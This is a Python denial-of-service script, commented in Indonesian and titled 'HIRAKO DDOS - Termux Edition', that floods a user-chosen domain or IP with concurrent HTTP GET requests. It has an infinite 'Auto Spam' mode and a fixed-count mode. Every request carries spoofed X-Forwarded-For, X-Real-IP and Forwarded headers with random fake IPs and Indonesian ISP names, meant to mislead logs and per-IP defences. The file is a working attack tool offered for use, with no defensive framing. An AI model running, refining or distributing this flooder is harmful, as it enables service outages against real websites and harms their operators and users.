#!/usr/bin/env python3

import asyncio
import aiohttp
import os
import sys
import time
import random

# -------------------------------
# ANSI Warna
# -------------------------------
R = "\033[31m"
G = "\033[32m"
Y = "\033[33m"
C = "\033[36m"
W = "\033[0m"

# -------------------------------
# Banner hacker style
# -------------------------------
BANNER = fr"""
{C}  _   _ _           _           ____      _           
 | | | (_)_ __ __ _| | _____   |  _ \  __| | ___  ___ 
 | |_| | | '__/ _` | |/ / _ \  | | | |/ _` |/ _ \/ __|
 |  _  | | | | (_| |   < (_) | | |_| | (_| | (_) \__ \\
 |_| |_|_|_|  \__,_|_|\_\___/  |____/ \__,_|\___/|___/

           {Y}HIRAKO DDOS - Termux Edition{W}
"""

# -------------------------------
# Slow Type
# -------------------------------
def slow_type(text, delay=0.003):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

# -------------------------------
# Bersihkan layar & tampilkan Banner
# -------------------------------
os.system('clear')
slow_type(BANNER)
print(C + "=" * 60 + W)

# -------------------------------
# INPUT dari User
# -------------------------------
base_url = input(f"{Y}[+] Masukkan Domain/IP Target  : {W}").strip()
port = input(f"{Y}[+] Masukkan Port (kosong = default): {W}").strip()

print(f"{Y}[+] Pilih Mode:{W}")
print(f"{G}    1) Auto Spam (infinite)")
print(f"{G}    2) Custom Request (sesuai jumlah){W}")
mode = input(f"{Y}[+] Mode [1/2]                   : {W}").strip()

if mode == "2":
    req_per_url = int(input(f"{Y}[+] Total Request/URL     : {W}").strip())
else:
    req_per_url = None  # tanda infinite

concurrency = int(input(f"{Y}[+] Concurrency (Thread)   : {W}").strip())
use_log = input(f"{Y}[+] Aktifkan Log? (Y/N)         : {W}").strip().upper()

# -------------------------------
# Format URL otomatis
# -------------------------------
if not base_url.startswith(("http://", "https://")):
    base_url = "http://" + base_url

if port:
    if ':' not in base_url.split('//')[1]:
        parts = base_url.split('//')
        base_url = f"{parts[0]}//{parts[1].split('/')[0]}:{port}"

url = base_url

log_file_name = "hirako_ddos_log.txt" if use_log == "Y" else None

print(C + "=" * 60 + W)
print(f"{G}[!] Target                : {url}{W}")
print(f"{G}[!] Mode                  : {'Auto Spam' if mode == '1' else 'Custom'}{W}")
if mode == "2":
    print(f"{G}[!] Total Request per URL : {req_per_url}{W}")
print(f"{G}[!] Concurrency           : {concurrency}{W}")
print(f"{G}[!] Log                   : {'Aktif' if log_file_name else 'Nonaktif'}{W}")
if log_file_name:
    print(f"{G}[!] Log disimpan di       : {log_file_name}{W}")
print(C + "=" * 60 + W)
time.sleep(1)

# -------------------------------
# Fake IP Generator
# -------------------------------
def generate_fake_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

sem = asyncio.Semaphore(concurrency)

# -------------------------------
# FUNGSI SERANGAN
# -------------------------------
async def send_request(session, log_file):
    async with sem:
        fake_ip = generate_fake_ip()
        fake_isp = random.choice([
            "IndiHome", "Telkomsel", "XL Axiata", "3 Indonesia", "Smartfren", "Biznet", "First Media", "MyRepublic"
        ])
        fake_network = random.choice([
            "4G LTE", "5G", "Fiber", "ADSL", "Wi-Fi", "Satellite", "Cable"
        ])

        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, Gecko) "
                "Chrome/115.0.0.0 Safari/533.36"
            ),
            "Referer": "https://google.com",
            "X-Forwarded-For": fake_ip,
            "Client-IP": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Network-Type": fake_network,
            "X-Network-Carrier": fake_isp,
            "X-ISP-Name": fake_isp,
            "Via": f"{fake_network} {fake_isp}",
            "Forwarded": f"for={fake_ip};by={fake_isp}"
        }

        status = f"{G}OK{W}"
        try:
            async with session.get(url, headers=headers, timeout=5) as resp:
                await resp.read()
                status = f"{G}Status {resp.status}{W} | Fake-IP: {fake_ip} | ISP: {fake_isp} | Net: {fake_network}"
        except Exception as e:
            status = f"{R}ERROR: {repr(e)}{W}"

        if log_file:
            log_file.write(f"{url} --> {status}\n")
            log_file.flush()
        print(f"{url} --> {status}")

# -------------------------------
# MAIN FUNCTION
# -------------------------------
async def main():
    connector = aiohttp.TCPConnector(limit=None, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)

    log_file = open(log_file_name, "w") if log_file_name else None

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []

        if mode == "1":
            print(f"{Y}[!] Mode Auto Spam aktif... tekan CTRL+C untuk berhenti!{W}")
            while True:
                task = asyncio.create_task(send_request(session, log_file))
                tasks.append(task)
                await asyncio.sleep(0.001)
        else:
            for _ in range(req_per_url):
                task = asyncio.create_task(send_request(session, log_file))
                tasks.append(task)
            await asyncio.gather(*tasks)

    if log_file:
        log_file.close()

    if mode == "2":
        print(f"\n{Y}[+] Semua request selesai dikirim.{W}")
        if log_file_name:
            print(f"{Y}[+] Log tersimpan di: {log_file_name}{W}")

# -------------------------------
# Jalankan Program
# -------------------------------
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{R}[!] Dihentikan oleh user.{W}")